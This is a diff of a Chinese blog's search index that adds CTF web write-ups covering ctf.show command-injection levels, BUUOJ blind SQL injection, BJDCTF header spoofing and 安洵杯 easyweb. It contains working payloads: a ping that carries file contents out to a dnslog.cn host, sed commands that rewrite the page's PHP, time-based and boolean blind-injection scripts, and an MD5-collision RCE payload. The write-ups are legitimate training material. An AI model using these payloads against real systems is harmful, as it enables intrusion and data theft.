@@ -1070,7 +1070,41 @@
 
 <p>可以看到第一开始的时候key1是0但是经过下面的分解之后他将我们在url上面赋值的_POST[key1]=1覆盖原本post值的内容，然后对post进行一个extract</p>
 <p>解析成变量名：也就是说我们现在又执行了$key1=1又对key1进行了一次赋值这样可以更改他的值变成36d</p>
-<h3 id="web-135"><a href="#web-135" class="headerlink" title="web 135"></a>web 135</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
+<h3 id="web-135"><a href="#web-135" class="headerlink" title="web 135"></a>web 135</h3><p>是133plus：</p>
+<p>相较上面多过滤了一些函数，curl被过滤了，主要考的还是外带信息，可以用ping</p>
+<p>前面跟上面还是一样的但是由curl变成了ping，因为在dnslog不能全回显，所以我们西药用awk以及nr配合读取行数，刚开始读取还是不行我们需要添加一层“正则”匹配一下flag中的数字还有字母，这样才能回显</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">?F=`$F `; ping `nl f*|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.a33jsr.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>
+
+<p>还有一种方法，就是直接重定向到一个我们新建的文件中，直接访问下载就能拿到flag</p>
+<p><code>nl f*&gt;xxx</code></p>
+<p>然后访问xxx文件就行了</p>
+<h3 id="web-136"><a href="#web-136" class="headerlink" title="web 136"></a>web 136</h3><p>没有过滤写文件tee,我们可以将前面查询的内容输出到文件</p>
+<p><code>ls /|tee 1</code>可以将根目录的文件写入1文件中然后将找到的flag文件写入到另一个文件中访问下载即可</p>
+<p>骚姿势：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls |xargs sed -i &#x27;s/die/echo/&#x27;</span><br><span class="line">ls |xargs sed -i &#x27;s/exec/system/&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>通过php内部语言将网页中的php代码更改，然后直接命令执行</p>
+<h3 id="web-137"><a href="#web-137" class="headerlink" title="web 137"></a>web 137</h3><p>讲到调用call_user_func的方法以及-&gt;跟::调用类中成员的方法</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">用于动态语境处理某个类的某个实例</span></span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure>
+
+<p>也就是说::可以不用实例就能调用类的静态方法</p>
+<h3 id="web-138"><a href="#web-138" class="headerlink" title="web 138"></a>web 138</h3><p>call_user_func可以传入数组</p>
+<p>如果传入的数组是</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">call_user_func(array($</span><span class="bash">classname,<span class="string">&#x27;function1&#x27;</span>))</span></span><br><span class="line">这个时候他就会直接调用classname类中的function1方法</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-139"><a href="#web-139" class="headerlink" title="web 139"></a>web 139</h3><p>跟136的代码一模一样，但是不能写文件，所以上面的方法不能用了，需要另外找一个方法：文件盲打</p>
+<p>因为没有过滤sleep所以可以进行盲打</p>
+<p>原理：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls / -1  #将根目录文件一行一个表示</span><br><span class="line">awk &#x27;NR==1&#x27; #截取第一行</span><br><span class="line">cut -c 1 #截取当前文件名的第一个字符</span><br></pre></td></tr></table></figure>
+
+<p>将我们分割的文件对字母遍历，如果正确就设置一个sleep，如果正确执行则返回</p>
+<p><img src="/2022/02/22/ctf-show/web139_1.png" alt="1"></p>
+<p>我们对这个进行一个判断：</p>
+<p><img src="/2022/02/22/ctf-show/web139_2.png" alt="1"></p>
+<p>附上payload脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;+++++++++++&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://33f5eb0a-181b-4cbf-8014-74a54f04a425.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;ctfshowabdegijklmnpqrtuvxyz-&#123;&#125;0123456789&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,5):</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            <span class="comment">#payload = &#x27;if [ `ls / -1 | cut -c %d | awk &quot;NR==4&quot; ` == &quot;%s&quot; ];then sleep 4;fi&#x27; % (j,m)   #f149_15_h3r3</span></span><br><span class="line">            payload = <span class="string">&#x27;if [ `cat /f149_15_h3r3 |cut -c %d ` == &quot;%s&quot; ];then sleep 4;fi&#x27;</span> %(j,m)</span><br><span class="line">            target = url + payload</span><br><span class="line">            <span class="comment">#print(target)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io = requests.get(target,timeout=(<span class="number">3</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result += m</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web-140"><a href="#web-140" class="headerlink" title="web 140"></a>web 140</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
 <p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
 <p>既然是ssti那么我们直接测试一下49看一下</p>
 <p>如果返回的是7777777那么就是jinjia2</p>
@@ -1783,6 +1817,9 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">url = &#x27;http://a01bf763-5eda-42df-959f-7286945de334.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(156,230):</span><br><span class="line">    sleep(1)</span><br><span class="line">    for j in range(32, 128):</span><br><span class="line">        database = f&quot;1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        tables = f&quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        columns = f&quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">        flag = f&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span><br><span class="line">        #io = requests.get(url +  database + &#x27;--+&#x27;)</span><br><span class="line">        io = requests.get(url + flag + &#x27;--+&#x27;)</span><br><span class="line">        if &quot;ERROR&quot; in io.text:</span><br><span class="line">            #print(i, j)</span><br><span class="line">            s += chr(j)</span><br><span class="line">            print(s)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
 
 <p>因为爆的太慢，还容易被ban这里就不多说了，flag在F1naI1y表的password中</p>
+<p>优化算法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://75d430f7-f380-47d0-bdde-a42ca16af21f.node4.buuoj.cn:81/search.php&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def payload(i, j):</span><br><span class="line">    # 数据库名字</span><br><span class="line">    #sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 表名</span><br><span class="line">    # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 列名</span><br><span class="line">    # sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    # 查询flag</span><br><span class="line">    sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j)</span><br><span class="line">    data = &#123;&quot;id&quot;: sql&#125;</span><br><span class="line">    r = requests.get(url, params=data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res = 1</span><br><span class="line">    else:</span><br><span class="line">        res = 0</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1, 10000):</span><br><span class="line">        print(i, &#x27;:&#x27;)</span><br><span class="line">        low = 31</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt;= high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            res = payload(i, mid)</span><br><span class="line">            if res:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid - 1</span><br><span class="line">        f = int((low + high + 1)) // 2</span><br><span class="line">        if (f == 127 or f == 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag += chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">print(&#x27;flag=&#x27;, flag)</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>极客大挑战</tag>
@@ -1844,6 +1881,77 @@
 ]]></content>
       <tags>
         <tag>ISITDTU</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SWPUCTF-2018-simplephp</title>
+    <url>/2022/03/13/SWPUCTF-2018-easyphp/</url>
+    <content><![CDATA[<h1 id="SWPUCTF-2018-simplephp"><a href="#SWPUCTF-2018-simplephp" class="headerlink" title="[SWPUCTF 2018]simplephp"></a>[SWPUCTF 2018]simplephp</h1>]]></content>
+      <tags>
+        <tag>SWPUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF复现</title>
+    <url>/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/</url>
+    <content><![CDATA[<p>今天复现了一下BJDCTF</p>
+<h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>首先进入页面</p>
+<p>是一个登录页面，以为是注入，随便输入了一下发现进去了，抓个包</p>
+<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/1.png" alt="1"></p>
+<p>发现藏了一个网页，访问一下</p>
+<p>第一次访问的时候网页显示发生了一个错误，刷新一下就可以发现下一步的提示（如果不刷新抓包的话没有在cookie中没有time）</p>
+<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/2.png" alt="1"></p>
+<p>抓个包</p>
+<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/3.png" alt="1"></p>
+<p>拿去解码一下发现是今天的日期，加九十九年，进入下一个提示</p>
+<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/4.png" alt="1"></p>
+<p>需要我们的ip是<code>localhost</code>自然而然想到<code>X-Forwarded-For</code></p>
+<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/5.png" alt="1"></p>
+<p>另一种方式，可以用client-ip也一样是伪造ip</p>
+<p>后面是需要伪造</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">who come from gem-love.com</span><br><span class="line">Referer: gem-love.com</span><br><span class="line">Sorry, this site is only optimized for browsers that run on Commodo 64</span><br><span class="line">User-Agent: Commodore 64</span><br><span class="line">Sorry, this site is only optimized for those whose email is root@gem-love.com</span><br><span class="line">From: root@gem-love.com</span><br><span class="line">Sorry, this site is only optimized for those who use the http proxy of y1ng.vip. if you dont have the proxy, pls contact us to buy, ￥100/Month</span><br><span class="line">Via: y1ng.vip</span><br></pre></td></tr></table></figure>
+
+<p>最后可以在这里看到flag的base64编码（如果用hackbar添加头的话需要抓包，源码不显示）</p>
+<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/6.png" alt="1"></p>
+<h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>进入页面是一个登录框，结合题目名称，应该就是在这里注入了，fuzz发现单引号双引号全被过滤了</p>
+<p>可以用的符号是</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`!@#$%^*()_+[]&#123;&#125;\|:,./&lt;&gt;?</span><br></pre></td></tr></table></figure>
+
+<p>可以发现反斜杠还有#没有被过滤，再找找别的，发现再robots,txt中藏了一个文件进去访问发现</p>
+<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/7.png" alt="1"></p>
+<p>他给出了我们在登陆框的查询语句，审计一下，单引号被过滤了所以username那边无法闭合，但是反斜杠没有被过滤，可以再最后添加一个反斜杠转义后面的单引号，然后可以用＃注释掉后面的单引号构造另一种闭合，也就是我们可以再password这添加我们的查询语句，测试的时候发现or没有被过滤，而为真的时候页面会回显</p>
+<p><img src="/2022/03/16/%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80/8.png" alt="1"></p>
+<p>显而易见这就是一个盲注了，构造payload脚本：（因为查找过于慢，照着之前写的finalsql注入的脚本改的）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b49b6771-4b40-4bd5-8959-4bea5ae5fd40.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;&quot;username&quot;: &quot;admin\\&quot;, &quot;password&quot;: &quot;&quot;&#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while (True):</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">        # payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid)</span><br><span class="line">        payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot; % (i, mid)</span><br><span class="line"></span><br><span class="line">        data[&#x27;password&#x27;] = payload</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        if &quot;stronger&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>BJDCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安洵杯-2019-easy-web</title>
+    <url>/2022/03/13/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
+    <content><![CDATA[<h3 id="安洵杯-2019-easyweb"><a href="#安洵杯-2019-easyweb" class="headerlink" title="[安洵杯 2019-easyweb]"></a>[安洵杯 2019-easyweb]</h3><p>进入题目：</p>
+<p>可以看到地址栏：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://06bfcebd-4b7a-4fc3-a20b-5a27424b7776.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure>
+
+<p>img有一个很明显的信息，我们拿去解码一下：</p>
+<p><img src="/2022/03/13/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/1.png" alt="1"></p>
+<p>可以看到是一张图片文件经过编码之后的信息，尝试一下是不是可以读取源代码：</p>
+<p>把index.php进行编码：<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p>
+<p>把里面的信息替换，抓个包拿到图片的base64编码信息，拿去解码之后得到源码：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line"><span class="meta">$</span><span class="bash">cmd = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span></span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line"><span class="meta">$</span><span class="bash">file = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span></span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>审计一下代码：</p>
+<p>首先需要设置img以及cmd，对img进行编码，输入的文件不能带有flag，然后返回文件名所带的进行64编码之后的内容，然后输出</p>
+<p>下面的if是针对cmd的，过滤了一些指令，其中<code>\\\\</code>过滤其实是有问题的，使得经过转移后的字符仍然可以继续执行，也就是完全没过滤\</p>
+<p>直接构造代码，因为ls被过滤了，用dir代替或者l\s，进入下面的if下面的if考到了MD5的强碰撞，使得字符串不等而MD5值相等，直接去找网上的碰撞字符或者脚本就行（记住抓包的时候要post抓包）直接RCE</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>安洵杯</tag>
       </tags>
   </entry>
 </search>
